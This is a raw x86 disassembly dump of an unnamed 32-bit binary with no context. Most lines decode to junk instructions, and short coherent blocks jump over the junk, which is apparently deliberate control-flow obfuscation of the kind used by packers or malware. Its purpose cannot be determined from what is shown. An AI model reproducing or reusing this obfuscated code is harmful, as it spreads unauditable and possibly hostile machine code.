  40b1d2:	inc    ebx
  40b1d3:	daa    
  40b1d4:	mov    eax,DWORD PTR [ebp-0x4]
  40b1d7:	push   0x74
  40b1d9:	pop    edi
  40b1da:	div    edi
  40b1dc:	jmp    0x40b29e
  40b1e1:	jecxz  0x40b169
  40b1e3:	rcl    DWORD PTR [ecx],0xe5
  40b1e6:	push   edi
  40b1e7:	repz test BYTE PTR [edx],0x43
  40b1eb:	shl    DWORD PTR [ecx+0x5f7769bd],1
  40b1f1:	adc    eax,0xa5000072
  40b1f6:	add    BYTE PTR [eax],al
  40b1f8:	add    BYTE PTR [edi+0x5d],dh
  40b1fb:	(bad)  
  40b1fc:	iret   
  40b1fd:	mov    dh,BYTE PTR [ebx+0x21]
  40b200:	mov    eax,0x84f7eb56
  40b205:	test   eax,0x3d26bc32
  40b20a:	pop    ebx
  40b20b:	(bad)  
  40b20c:	push   ds
  40b20d:	out    0xfa,al
  40b20f:	add    al,0xe9
  40b211:	ds mov bh,0x14
  40b214:	pop    ebx
  40b215:	cwde   
  40b216:	fild   WORD PTR [edx]
  40b218:	cmp    BYTE PTR [ebx+0x6c],ch
  40b21b:	push   ecx
  40b21c:	sbb    BYTE PTR [esi-0x7],al
  40b21f:	xchg   ebx,eax
  40b220:	fs ret 
  40b222:	mov    ebp,0x6d283e7
  40b227:	inc    edx
  40b228:	je     0x40b295
  40b22a:	jl     0x40b232
  40b22c:	jo     0x40b283
  40b22e:	pop    ebx
  40b22f:	lahf   
  40b230:	stc    
  40b231:	in     eax,0x10
  40b233:	pop    esp
  40b234:	jge    0x40b263
  40b236:	mov    eax,0xa78a1ab3
  40b23b:	stc    
  40b23c:	cmc    
  40b23d:	dec    esi
  40b23e:	out    dx,eax
  40b23f:	(bad)  
  40b240:	lahf   
  40b241:	pop    ebp
  40b242:	into   
  40b243:	je     0x261399f7
  40b249:	lahf   
  40b24a:	push   0x29b3c17b
  40b24f:	jae    0x40b22d
  40b251:	call   0xa5a8:0x3666440f
  40b258:	push   cs
  40b259:	or     DWORD PTR [ecx-0x13],0x51562d1b
  40b260:	sub    eax,0x63920aed
  40b265:	rcl    DWORD PTR [ecx+0x6f],1
  40b268:	(bad)
  40b26c:	cld    
  40b26d:	push   eax
  40b26e:	mov    edx,0x5c0f54fc
  40b273:	pushf  
  40b274:	mov    eax,ds:0xcdf26f7c
  40b279:	pusha  
  40b27a:	outs   dx,DWORD PTR ds:[esi]
  40b27b:	pop    ebp
  40b27c:	enter  0xfd34,0x20
  40b280:	jmp    0x40b252
  40b282:	add    al,0xea
  40b284:	push   eax
  40b285:	sub    DWORD PTR [edx+eiz*1-0x7b],edi
  40b289:	les    ebp,FWORD PTR fs:[edi+0x7d574750]
  40b290:	aad    0x95
  40b292:	pop    eax
  40b293:	adc    BYTE PTR [ebx],cl
  40b295:	pop    ss
  40b296:	jge    0x40b288
  40b298:	or     edx,ebx
  40b29a:	mov    ebp,0xbb663924
  40b29f:	mov    ds:0x8b0002a9,eax
  40b2a4:	clc    
  40b2a5:	jmp    0x40b367
  40b2aa:	inc    ebp
  40b2ab:	ins    DWORD PTR es:[edi],dx
  40b2ac:	jne    0x40b230
  40b2ae:	jge    0x40b24a
  40b2b0:	imul   edi
  40b2b2:	mov    es,WORD PTR [edi+0xc6833fb]
  40b2b8:	push   ds
  40b2b9:	mov    eax,ds:0x72ba
  40b2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2bf:	add    BYTE PTR [eax],al
  40b2c1:	add    BYTE PTR [esi+0x43],ah
  40b2c4:	(bad)  
  40b2c5:	mov    edx,0xa91590bf
  40b2ca:	pop    ds
  40b2cb:	ds inc edx
  40b2cd:	push   esi
  40b2ce:	xchg   BYTE PTR [ebx-0x6d7442ba],dh
  40b2d4:	test   al,0xd7
  40b2d6:	jmp    0x570d:0x76dc075d
  40b2dd:	fld    QWORD PTR [ecx+0x33]
  40b2e0:	mov    al,0x4e
  40b2e2:	call   0x7859:0x820aa68b
  40b2e9:	dec    esp
  40b2ea:	je     0x40b2bf
  40b2ec:	out    dx,al
  40b2ed:	push   es
  40b2ee:	sbb    eax,0x37ec3dfc
  40b2f3:	test   ch,dh
  40b2f5:	out    0x16,eax
  40b2f7:	cmp    dl,BYTE PTR [ecx+0x5f5d7328]
  40b2fd:	dec    ebp
  40b2fe:	dec    ebx
  40b2ff:	jnp    0x40b30a
  40b301:	loopne 0x40b36f
  40b303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b304:	xchg   esp,eax
  40b305:	dec    edi
  40b306:	xchg   ebx,eax
  40b307:	and    eax,DWORD PTR [edx+0x5843188f]
  40b30d:	mov    bh,BYTE PTR [edx]
  40b30f:	(bad)  
  40b310:	icebp  
  40b311:	cmp    eax,0x3740210e
  40b316:	jmp    0x2883:0xf4750199
  40b31d:	pop    eax
  40b31e:	xor    al,0x1
  40b320:	dec    eax
  40b321:	inc    ecx
  40b322:	bnd ret 0xb62b
  40b326:	mov    ch,0x92
  40b328:	clc    
  40b329:	or     eax,0x9d2c969a
  40b32e:	je     0x40b343
  40b330:	scas   al,BYTE PTR es:[edi]
  40b331:	scas   al,BYTE PTR es:[edi]
  40b332:	adc    eax,0x43f976a5
  40b337:	ins    DWORD PTR es:[edi],dx
  40b338:	mov    eax,ds:0xce7da59e
  40b33d:	or     ch,BYTE PTR [esi]
  40b33f:	in     eax,dx
  40b340:	hlt    
  40b341:	test   eax,0xc76de731
  40b346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b347:	mov    bh,BYTE PTR ds:[eax+0x2d1d7f40]
  40b34e:	(bad)  
  40b34f:	iret   
  40b350:	sti    
  40b351:	out    dx,eax
  40b352:	pop    esp
  40b353:	dec    ebp
  40b354:	sti    
  40b355:	inc    ecx
  40b356:	mov    ebp,0x80f576bb
  40b35b:	add    DWORD PTR [eax+edx*1-0x64],0x23c6f1c8
  40b363:	(bad)  
  40b364:	dec    ebx
  40b365:	mov    edx,edx
  40b367:	mov    eax,DWORD PTR [ebp-0x8]
  40b36a:	mov    edx,DWORD PTR [ebp-0xc]
  40b36d:	or     edi,eax
  40b36f:	mov    eax,0x5520
  40b374:	sub    eax,edx
  40b376:	mov    edx,DWORD PTR [ebp-0x10]
  40b379:	sub    eax,edx
  40b37b:	xor    eax,0x2bfa
  40b380:	jmp    0x40b442
  40b385:	into   
  40b386:	push   cs
  40b387:	fcom   DWORD PTR [eax+ebx*8+0x45eced6]
  40b38e:	xchg   esi,eax
  40b38f:	add    al,0x67
  40b391:	lock add bh,BYTE PTR [ebx+0x33]
  40b395:	pop    edi
  40b396:	jae    0x40b398
  40b398:	add    BYTE PTR [ebp-0x38000000],ah
  40b39e:	mov    ch,0x9
  40b3a0:	pusha  
  40b3a1:	sti    
  40b3a2:	sub    al,BYTE PTR [esi+0x8]
  40b3a5:	setg   dl
  40b3a8:	ficom  WORD PTR [ecx-0x4729d621]
  40b3ae:	(bad)  
  40b3af:	sbb    eax,0xa70ad270
  40b3b4:	rcl    BYTE PTR [ecx+0x1dfb3882],0xea
  40b3bb:	mov    eax,ds:0x7f292e4b
  40b3c0:	xchg   DWORD PTR [ebp-0x2d],ebx
  40b3c3:	dec    edi
  40b3c4:	call   0xa559d66
  40b3c9:	out    dx,al
  40b3ca:	inc    ebp
  40b3cb:	jl     0x40b418
  40b3cd:	push   eax
  40b3ce:	test   eax,0x9ede6364
  40b3d3:	into   
  40b3d4:	lods   eax,DWORD PTR ds:[esi]
  40b3d5:	pop    ebx
  40b3d6:	inc    esp
  40b3d7:	dec    esp
  40b3d8:	sub    eax,0x3d3b91ec
  40b3dd:	(bad)  
  40b3de:	loopne 0x40b405
  40b3e0:	sbb    BYTE PTR [eax],al
  40b3e2:	loopne 0x40b382
  40b3e4:	repz and DWORD PTR ss:[ebx+ebx*2],edx
  40b3e9:	mov    esi,0xd07e3f95
  40b3ee:	sub    edx,edi
  40b3f0:	push   ebp
  40b3f1:	inc    edx
  40b3f2:	out    dx,eax
  40b3f3:	push   ecx
  40b3f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3f5:	push   cs
  40b3f6:	sbb    eax,0x8cd348d4
  40b3fb:	jg     0x40b411
  40b3fd:	jle    0x40b3f2
  40b3ff:	xchg   esp,eax
  40b400:	je     0x40b3a3
  40b402:	mov    cl,0x98
  40b404:	adc    BYTE PTR [esi],0x7d
  40b407:	fwait
  40b408:	add    esp,DWORD PTR [esi]
  40b40a:	pop    ss
  40b40b:	test   eax,0xbf9c0e5
  40b410:	inc    esp
  40b411:	pop    ebp
  40b412:	sub    DWORD PTR [ecx+0x32ca6cc5],esp
  40b418:	sbb    BYTE PTR [eax+edx*2-0x51],ch
  40b41c:	ins    DWORD PTR es:[edi],dx
  40b41d:	xor    ebp,DWORD PTR [ecx-0x36]
  40b420:	sub    al,0x1b
  40b422:	scas   al,BYTE PTR es:[edi]
  40b423:	mov    cl,0xe9
  40b425:	jbe    0x40b40f
  40b427:	ins    DWORD PTR es:[edi],dx
  40b428:	idiv   DWORD PTR [edx+0x53]
  40b42b:	sub    al,0xf9
  40b42d:	inc    edx
  40b42e:	pop    ecx
  40b42f:	mov    DWORD PTR [eax-0x39],0x4ebf57aa
  40b436:	adc    dl,BYTE PTR [ebx+0x60]
  40b439:	in     eax,dx
  40b43a:	popf   
  40b43b:	xor    DWORD PTR [ecx],ecx
  40b43d:	pop    ecx
  40b43e:	cli    
  40b43f:	sbb    al,0xf0
  40b441:	int3   
  40b442:	xor    edx,edx
  40b444:	jmp    0x40b506
  40b449:	scas   al,BYTE PTR es:[edi]
  40b44a:	inc    esp
  40b44b:	std    
  40b44c:	mov    ah,0xff
  40b44e:	mov    ebp,0xb6695eef
  40b453:	pop    edi
  40b454:	xchg   ebp,eax
  40b455:	mov    bl,0xca
  40b457:	xchg   edx,eax
  40b458:	jo     0x40b45e
  40b45a:	je     0x40b45c
  40b45c:	add    BYTE PTR [ebp-0x48000000],ah
  40b462:	or     BYTE PTR [edi],bh
  40b464:	loope  0x40b428
  40b466:	xchg   esp,eax
  40b467:	push   0x2f
  40b469:	pop    ebx
  40b46a:	sub    BYTE PTR [ecx-0x2],dh
  40b46d:	add    eax,0x84e3cf8d
  40b472:	or     al,ah
  40b474:	adc    eax,0xaa784445
  40b479:	jg     0x40b415
  40b47b:	mov    ds:0x786a34b6,al
  40b480:	xor    eax,0xc90a3595
  40b485:	mov    bl,0xea
  40b487:	sub    DWORD PTR ds:0xe20a5683,0xb503c142
  40b491:	fimul  WORD PTR [ecx-0x71fe766]
  40b497:	xor    eax,0x7979888c
  40b49c:	mul    DWORD PTR [ecx+0xda6294d]
  40b4a2:	adc    eax,0x590a0939
  40b4a7:	push   ebp
  40b4a8:	cmp    edx,eax
  40b4aa:	lock lea edx,[ebx]
  40b4ad:	in     eax,dx
  40b4ae:	xlat   BYTE PTR ds:[ebx]
  40b4af:	mov    bl,0xaa
  40b4b1:	adc    al,0xb6
  40b4b3:	cmp    al,0x47
  40b4b5:	mov    ecx,0x8deb7cd4
  40b4ba:	inc    ecx
  40b4bb:	fistp  WORD PTR [ebp+ebp*8-0x80]
  40b4bf:	add    ch,cl
  40b4c1:	aaa    
  40b4c2:	out    dx,al
  40b4c3:	mov    esp,0xf93261de
  40b4c8:	sub    BYTE PTR [edi],0x7c
  40b4cb:	stc    
  40b4cc:	sar    DWORD PTR [ecx+ebx*2-0x31505b13],1
  40b4d3:	sub    DWORD PTR [eax],ebx
  40b4d5:	sub    al,0xe4
  40b4d7:	mov    bh,0xf2
  40b4d9:	xor    BYTE PTR [esi+0x64],0xc
  40b4dd:	pusha  
  40b4de:	les    ebp,FWORD PTR [edi*8+0x28afcf46]
  40b4e5:	dec    ecx
  40b4e6:	push   ebx
  40b4e7:	aam    0x78
  40b4e9:	retf   0x3174
  40b4ec:	gs mov bl,0xa7
  40b4ef:	pusha  
  40b4f0:	dec    ecx
  40b4f1:	xor    bh,BYTE PTR [ebp-0x68a53c87]
  40b4f7:	pusha  
  40b4f8:	pop    ss
  40b4f9:	and    al,0x39
  40b4fb:	out    0x8,al
  40b4fd:	mov    ah,0xd8
  40b4ff:	(bad)  
  40b500:	cld    
  40b501:	loop   0x40b483
  40b503:	out    0x9c,eax
  40b505:	popf   
  40b506:	div    ebx
  40b508:	mov    edx,DWORD PTR ds:0x4331b4
  40b50e:	xor    edi,0x2d64
  40b514:	add    edi,ecx
  40b516:	jmp    0x40b5d8
  40b51b:	sub    BYTE PTR [edx-0x111e19c],al
  40b521:	jp     0x40b4d9
  40b523:	aam    0xf2
  40b525:	in     eax,dx
  40b526:	mov    esp,0xcc3a767c
  40b52b:	test   eax,0xa5000074
  40b530:	add    BYTE PTR [eax],al
  40b532:	add    BYTE PTR [edx],ah
  40b534:	repnz pop ebp
  40b536:	mov    cl,0xa4
  40b538:	xchg   ebp,eax
  40b539:	mov    BYTE PTR [edx-0x6a],ch
  40b53c:	cmp    DWORD PTR [ebx],edi
  40b53e:	(bad)  
  40b53f:	out    dx,al
  40b540:	mov    bl,BYTE PTR [eax-0x332cf721]
  40b546:	xchg   edx,eax
  40b547:	and    eax,0xeea58dac
  40b54c:	ins    BYTE PTR es:[edi],dx
  40b54d:	shr    BYTE PTR [edi-0x400c4664],cl
  40b553:	xor    al,0x36
  40b555:	inc    eax
  40b556:	adc    eax,0xa30259c5
  40b55b:	lods   eax,DWORD PTR ds:[esi]
  40b55c:	shl    bh,0x44
  40b55f:	mov    eax,ds:0x14853121
  40b564:	jb     0x40b548
  40b566:	sub    BYTE PTR [esp+edi*4-0x21],0xf
  40b56b:	add    dl,BYTE PTR ss:[esi-0x55]
  40b56f:	mov    edx,0x52b3d521
  40b574:	mov    edi,0x2b6cd1c
  40b579:	in     al,0xbe
  40b57b:	repz repz pop edi
  40b57e:	push   edi
  40b57f:	cmp    dl,BYTE PTR [edx]
  40b581:	retf   
  40b582:	iret   
  40b583:	lods   al,BYTE PTR ds:[esi]
  40b584:	mov    ecx,0x8d896b59
  40b589:	pop    esp
  40b58a:	mov    DWORD PTR [ebp+0x26a3c559],0x2df2e6fe
  40b594:	lods   al,BYTE PTR ds:[esi]
  40b595:	xchg   DWORD PTR [edi-0x53],ebx
  40b598:	add    al,bh
  40b59a:	(bad)  
  40b59b:	pop    edx
  40b59c:	in     eax,0x2f
  40b59e:	cmp    edx,DWORD PTR [ecx-0x7a22e7b8]
  40b5a4:	pop    ecx
  40b5a5:	or     al,0x1f
  40b5a7:	pushf  
  40b5a8:	mov    ds:0x275b1290,eax
  40b5ad:	fbld   TBYTE PTR [ecx+0x1b]
  40b5b0:	in     eax,dx
  40b5b1:	ja     0x40b574
  40b5b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5b4:	jae    0x40b60b
  40b5b6:	mov    al,0x56
  40b5b8:	sbb    ebx,esi
  40b5ba:	in     eax,0x23
  40b5bc:	stc    
  40b5bd:	leave  
  40b5be:	je     0x40b5c8
  40b5c0:	inc    ebp
  40b5c1:	dec    ecx
  40b5c2:	sbb    bh,bh
  40b5c4:	or     edi,DWORD PTR [ecx]
  40b5c6:	test   BYTE PTR [eax+ecx*8+0x17edfa95],al
  40b5cd:	nop
  40b5ce:	cli    
  40b5cf:	jae    0x40b644
  40b5d1:	jnp    0x40b55f
  40b5d3:	mov    cl,0x21
  40b5d5:	pop    esi
  40b5d6:	shl    DWORD PTR [esi+0x3],cl
  40b5d9:	cmp    BYTE PTR [ecx+eax*1+0x558b0000],0x8
  40b5e1:	jmp    0x40b6a3
  40b5e6:	rcr    BYTE PTR ds:0xfeef18e3,1
  40b5ec:	sti    
  40b5ed:	fisttp QWORD PTR [edi+eiz*2-0x370eb1fd]
  40b5f4:	adc    DWORD PTR [ebp+0x754e],0xffffffa5
  40b5fb:	add    BYTE PTR [eax],al
  40b5fd:	add    BYTE PTR [ebx+0x5a],ah
  40b600:	mov    al,0xab
  40b602:	es icebp 
  40b604:	or     al,0x58
  40b606:	pushf  
  40b607:	je     0x40b5f8
  40b609:	sahf   
  40b60a:	and    edx,DWORD PTR [eax-0x3e]
  40b60d:	mov    ds:0x3aa40c33,eax
  40b612:	mov    ds:0xa159ca6a,al
  40b617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b618:	add    eax,0xaaf91750
  40b61d:	cmp    edx,DWORD PTR [ecx+0x654bc6b8]
  40b623:	jno    0x40b60c
  40b625:	sbb    cl,bl
  40b627:	add    BYTE PTR [ebx+0x39],bh
  40b62a:	icebp  
  40b62b:	fcmovnu st,st(6)
  40b62d:	adc    DWORD PTR [ecx+0xa],ecx
  40b630:	loope  0x40b6af
  40b632:	stc    
  40b633:	sahf   
  40b634:	(bad)  
  40b635:	pop    ds
  40b636:	arpl   WORD PTR [ebx-0x4625396c],dx
  40b63c:	hlt    
  40b63d:	inc    ecx
  40b63e:	sub    al,ah
  40b640:	fst    DWORD PTR [esi+0x6a]
  40b643:	adc    DWORD PTR [edi-0x6788a54c],esi
  40b649:	stc    
  40b64a:	xchg   edi,eax
  40b64b:	push   es
  40b64c:	popf   
  40b64d:	mov    ah,0x12
  40b64f:	fstp   QWORD PTR [edx+0x46]
  40b652:	fsub   QWORD PTR [ebx-0x34fc966e]
  40b658:	mov    ebx,0x493b5f2f
  40b65d:	add    BYTE PTR [ecx],bh
  40b65f:	fst    QWORD PTR [edi+0x4c62e5d3]
  40b665:	push   esp
  40b666:	xchg   ecx,ebp
  40b668:	mov    ecx,0xe2be7d60
  40b66d:	inc    esp
  40b66e:	mov    bh,0xb1
  40b670:	rcr    DWORD PTR [ebp-0x475f6b69],1
  40b676:	out    dx,eax
  40b677:	out    0x6e,al
  40b679:	or     DWORD PTR [ebp+0x73],esp
  40b67c:	cwde   
  40b67d:	lahf   
  40b67e:	sub    BYTE PTR [eax],cl
  40b680:	xchg   ebp,ebx
  40b682:	mov    ebp,0x39945a97
  40b687:	dec    esp
  40b688:	push   DWORD PTR [esi-0x50]
  40b68b:	xor    dh,ah
  40b68d:	test   al,0xa0
  40b68f:	(bad)  
  40b690:	into   
  40b691:	sub    eax,DWORD PTR [esi-0x5e]
  40b694:	(bad)  
  40b695:	jb     0x40b6f5
  40b697:	or     BYTE PTR [edx],0x41
  40b69a:	outs   dx,DWORD PTR ds:[esi]
  40b69b:	push   edi
  40b69c:	out    0x25,al
  40b69e:	ds jle 0x40b6ee
  40b6a1:	dec    esp
  40b6a2:	cld    
  40b6a3:	mov    dl,BYTE PTR [edi+edx*1-0x5dbf]
  40b6aa:	mov    edi,DWORD PTR [ebp-0x14]
  40b6ad:	mov    BYTE PTR [eax+ecx*1-0x7e47],dl
  40b6b4:	xor    edx,edx
  40b6b6:	mov    eax,0x71c7
  40b6bb:	div    edi
  40b6bd:	jmp    0x40b77f
  40b6c2:	dec    edx
  40b6c3:	call   0xbf5b:0xfffeffae
  40b6ca:	pop    ss
  40b6cb:	cmp    eax,0x22270d77
  40b6d0:	mov    dl,0x70
  40b6d2:	repz jne 0x40b6d5
  40b6d5:	add    BYTE PTR [ebp-0x30000000],ah
  40b6db:	loope  0x40b6f9
  40b6dd:	mov    ecx,0xa1bff8a4
  40b6e2:	enter  0xb0c8,0x35
  40b6e6:	ror    BYTE PTR [ebx],1
  40b6e8:	loope  0x40b6a5
  40b6ea:	xor    dh,BYTE PTR [ebx+0x10a07fd0]
  40b6f0:	inc    ebp
  40b6f1:	mov    cl,BYTE PTR [edx]
  40b6f3:	and    BYTE PTR [edi+ebp*1],bl
  40b6f6:	icebp  
  40b6f7:	xor    DWORD PTR [ebx],ebp
  40b6f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6fa:	and    eax,0xc5db8c22
  40b6ff:	arpl   WORD PTR [ebp-0x284a3d08],ax
  40b705:	pop    ds
  40b706:	xchg   edx,eax
  40b707:	stc    
  40b708:	cli    
  40b709:	sub    eax,0xa69a28b2
  40b70e:	pop    esp
  40b70f:	push   esp
  40b710:	mov    al,ds:0x7cf9f141
  40b715:	shl    DWORD PTR [esi-0xd444fe3],1
  40b71b:	neg    DWORD PTR [ecx]
  40b71d:	hlt    
  40b71e:	dec    eax
  40b71f:	mov    ebp,0x76ebd4ac
  40b724:	stos   DWORD PTR es:[edi],eax
  40b725:	xchg   edi,eax
  40b726:	jle    0x40b737
  40b728:	jnp    0x40b722
  40b72a:	xchg   BYTE PTR [eax-0x57],ch
  40b72d:	pop    ss
  40b72e:	lods   al,BYTE PTR ds:[esi]
  40b72f:	or     DWORD PTR [edi-0x11440c59],ebx
  40b735:	mov    bh,0x86
  40b737:	lds    ebp,FWORD PTR [ebx+0x40]
  40b73a:	cwde   
  40b73b:	out    dx,al
  40b73c:	arpl   ax,dx
  40b73e:	jge    0x40b74c
  40b740:	fnstsw WORD PTR [esi-0x3fb1dc83]
  40b746:	xchg   DWORD PTR [edx+0x1b4647b6],esi
  40b74c:	dec    esi
  40b74d:	xchg   edi,eax
  40b74e:	popa   
  40b74f:	push   ebx
  40b750:	mov    edx,0xc192366f
  40b755:	ins    DWORD PTR es:[edi],dx
  40b756:	xor    al,0x40
  40b758:	mov    al,0xce
  40b75a:	aaa    
  40b75b:	fs jb  0x40b712
  40b75e:	dec    edx
  40b75f:	sub    cl,dh
  40b761:	jle    0x40b74f
  40b763:	ret    
  40b764:	int3   
  40b765:	pop    ecx
  40b766:	out    dx,al
  40b767:	push   ebp
  40b768:	pop    eax
  40b769:	mov    al,ds:0x58f6d45f
  40b76e:	imul   edi,DWORD PTR [edx+0x7414a41f],0x31
  40b775:	(bad)  
  40b776:	mov    edi,DWORD PTR [eax+0x43]
  40b779:	jbe    0x40b770
  40b77b:	add    BYTE PTR [ebx+0x32],cl
  40b77e:	push   cs
  40b77f:	mov    edx,DWORD PTR [ebp-0x18]
  40b782:	mov    edi,0x5068
  40b787:	add    eax,0x3a6f
  40b78c:	xor    eax,edx
  40b78e:	xor    edx,edx
  40b790:	div    edi
  40b792:	mov    edi,DWORD PTR [ebp-0x1c]
  40b795:	jmp    0x40b857
  40b79a:	dec    esi
  40b79b:	shl    edi,1
  40b79d:	jmp    0x332e:0xf55feeff
  40b7a4:	rcr    BYTE PTR [edi-0x23],0x60
  40b7a8:	mov    eax,0x7698e4
  40b7ad:	add    BYTE PTR [ebp-0x14000000],ah
  40b7b3:	ss pop ebx
  40b7b5:	adc    eax,0x904dea60
  40b7ba:	xor    bh,BYTE PTR [ecx*8+0x4ca6018a]
  40b7c1:	mov    dh,0x82
  40b7c3:	ins    BYTE PTR es:[edi],dx
  40b7c4:	sar    DWORD PTR [edi-0x58dc7055],0x53
  40b7cb:	add    al,0x88
  40b7cd:	enter  0x89e7,0xcb
  40b7d1:	pushf  
  40b7d2:	das    
  40b7d3:	jo     0x40b7bb
  40b7d5:	jge    0x40b827
  40b7d7:	mov    ah,0xf8
  40b7d9:	daa    
  40b7da:	adc    BYTE PTR [ebx-0x2a],0x59
  40b7de:	cmp    BYTE PTR [edi-0x6fb7ccf],bl
  40b7e4:	fwait
  40b7e5:	out    0x59,al
  40b7e7:	mov    ebx,0xbb5bea0e
  40b7ec:	ret    
  40b7ed:	fcom   DWORD PTR [eax-0x6f45f81e]
  40b7f3:	frstor [ecx-0x418ccd07]
  40b7f9:	mov    esp,DWORD PTR [esi+0x3]
  40b7fc:	daa    
  40b7fd:	mov    ecx,0x3fcd0d93
  40b802:	lods   al,BYTE PTR ds:[esi]
  40b803:	xor    edx,DWORD PTR [esi-0x2b]
  40b806:	lods   al,BYTE PTR ds:[esi]
  40b807:	repnz xor al,0x3f
  40b80a:	add    BYTE PTR [ecx],bh
  40b80c:	sub    edx,DWORD PTR [esi-0x6b]
  40b80f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b810:	popa   
  40b811:	jl     0x40b853
  40b813:	xchg   ebp,eax
  40b814:	in     eax,dx
  40b815:	out    dx,al
  40b816:	rcr    BYTE PTR [edx-0x68fa4f44],0xd
  40b81d:	push   edi
  40b81e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b81f:	jno    0x40b7e2
  40b821:	das    
  40b822:	pop    ecx
  40b823:	bound  ecx,QWORD PTR ds:0x9e35a61f
  40b829:	jb     0x40b889
  40b82b:	fwait
  40b82c:	cs pop eax
  40b82e:	ficom  DWORD PTR [ecx+0x571da6f1]
  40b834:	aas    
  40b835:	xor    edi,DWORD PTR [ecx-0x4d8ac390]
  40b83b:	arpl   WORD PTR [ecx+0x6da4cac8],ax
  40b841:	scas   al,BYTE PTR es:[edi]
  40b842:	cmp    al,0x82
  40b844:	outs   dx,BYTE PTR ds:[esi]
  40b845:	shl    BYTE PTR [esi-0x68],1
  40b848:	in     al,dx
  40b849:	test   al,0x2d
  40b84b:	mov    ebx,DWORD PTR [esi-0x4f]
  40b84e:	push   cs
  40b84f:	lock mov ebp,0x7e5e5fdc
  40b855:	add    eax,0x3d233e6
  40b85a:	enter  0x458b,0xe0
  40b85e:	jmp    0x40b920
  40b863:	sbb    ah,BYTE PTR [esi+0x68]
  40b866:	ins    DWORD PTR es:[edi],dx
  40b867:	jl     0x40b8d8
  40b869:	pop    ds
  40b86a:	ja     0x40b7f6
  40b86c:	pop    DWORD PTR [edi+0x74]
  40b86f:	popf   
  40b870:	cmp    DWORD PTR [ecx+0x7a],esi
  40b873:	cmp    eax,0xa5000077
  40b878:	add    BYTE PTR [eax],al
  40b87a:	add    BYTE PTR [ebx+edi*1-0xc],bh
  40b87e:	jae    0x40b89d
  40b880:	pop    esp
  40b881:	pop    es
  40b882:	enter  0x488,0xad
  40b886:	cli    
  40b887:	fstp   QWORD PTR [eax-0x37fbd694]
  40b88d:	aam    0xad
  40b88f:	xor    DWORD PTR [esi+0x1f],0xb8530506
  40b896:	inc    esi
  40b897:	xchg   ecx,eax
  40b898:	loope  0x40b8b8
  40b89a:	jmp    0x1eb6:0x591af4f0
  40b8a1:	pop    esi
  40b8a2:	fnstenv [eax-0x23db7bd3]
  40b8a8:	mov    ecx,0x48bbd5a1
  40b8ad:	dec    edx
  40b8ae:	jge    0x40b895
  40b8b0:	es add eax,0xf1c3669e
  40b8b6:	xchg   ebx,eax
  40b8b7:	push   ecx
  40b8b8:	pusha  
  40b8b9:	pop    ebp
  40b8ba:	adc    al,0x21
  40b8bc:	mov    ch,0xcd
  40b8be:	iret   
  40b8bf:	cld    
  40b8c0:	or     ecx,DWORD PTR ds:0xf6c7b32
  40b8c6:	jp     0x40b938
  40b8c8:	shl    BYTE PTR [ecx+0x1639d182],cl
  40b8ce:	loope  0x40b876
  40b8d0:	pusha  
  40b8d1:	in     al,dx
  40b8d2:	pusha  
  40b8d3:	test   eax,0x7f5b38ef
  40b8d8:	xor    DWORD PTR [ecx],esp
  40b8da:	in     eax,0xb3
  40b8dc:	sub    eax,0x81b85c93
  40b8e1:	(bad)  
  40b8e2:	out    0x32,al
  40b8e4:	xchg   ebp,eax
  40b8e5:	sahf   
  40b8e6:	popa   
  40b8e7:	clc    
  40b8e8:	push   ecx
  40b8e9:	ins    BYTE PTR es:[edi],dx
  40b8ea:	cmp    al,0xcb
  40b8ec:	sbb    al,0x25
  40b8ee:	pop    ebx
  40b8ef:	hlt    
  40b8f0:	mov    ch,0xb0
  40b8f2:	aad    0xf6
  40b8f4:	xchg   esp,eax
  40b8f5:	shl    DWORD PTR [ecx+edi*1],1
  40b8f8:	aad    0x36
  40b8fa:	mov    BYTE PTR [edx+0x2],0xdf
  40b8fe:	imul   esp,edi,0x9b85e7af
  40b904:	sahf   
  40b905:	scas   al,BYTE PTR es:[edi]
  40b906:	ss fcomip st,st(6)
  40b909:	sbb    eax,0xc4d928bc
  40b90e:	je     0x40b8b2
  40b910:	dec    ecx
  40b911:	sbb    DWORD PTR [esi],ebx
  40b913:	inc    eax
  40b914:	mov    ebp,0x9ec1006d
  40b919:	pushf  
  40b91a:	mov    ds:0x7a335cb9,al
  40b91f:	xor    bh,dh
  40b921:	test   DWORD PTR [ebx-0x1ed223ab],0xb000079
  40b92b:	ret    0xbde9
  40b92e:	add    BYTE PTR [eax],al
  40b930:	add    BYTE PTR [ebx],dl
  40b932:	push   edi
  40b933:	int    0xcd
  40b935:	int    0xdf
  40b937:	adc    ebx,edi
  40b939:	idiv   DWORD PTR [ebp+ebx*4-0x5b]
  40b93d:	and    DWORD PTR [edi+0x77e2384e],edx
  40b943:	add    BYTE PTR [eax],al
  40b945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b946:	add    BYTE PTR [eax],al
  40b948:	add    al,ah
  40b94a:	jnp    0x40b8e0
  40b94c:	mov    ch,cl
  40b94e:	int    0xe4
  40b950:	jnp    0x40b9bd
  40b952:	cmp    al,0x98
  40b954:	rcr    DWORD PTR [eax-0x56],1
  40b957:	popa   
  40b958:	cmp    al,0x3
  40b95a:	and    eax,0xcdd59295
  40b95f:	(bad)  
  40b960:	aam    0x43
  40b962:	popf   
  40b963:	nop
  40b964:	xchg   ebx,eax
  40b965:	mov    DWORD PTR [ebx+0x392d3eee],ebx
  40b96b:	adc    eax,0xf121c382
  40b970:	pushf  
  40b971:	iret   
  40b972:	test   al,0x3e
  40b974:	add    DWORD PTR ds:0xc15ae8c9,edx
  40b97a:	pop    eax
  40b97b:	es hlt 
  40b97d:	or     al,0xdd
  40b97f:	adc    DWORD PTR [esi],ecx
  40b981:	inc    edi
  40b982:	loop   0x40b9f0
  40b984:	test   esp,esi
  40b986:	jmp    0x6dad6523
  40b98b:	std    
  40b98c:	int3   
  40b98d:	fcmovne st,st(2)
  40b98f:	mov    ch,0x38
  40b991:	adc    eax,0x589867b
  40b996:	xchg   ecx,eax
  40b997:	scas   al,BYTE PTR es:[edi]
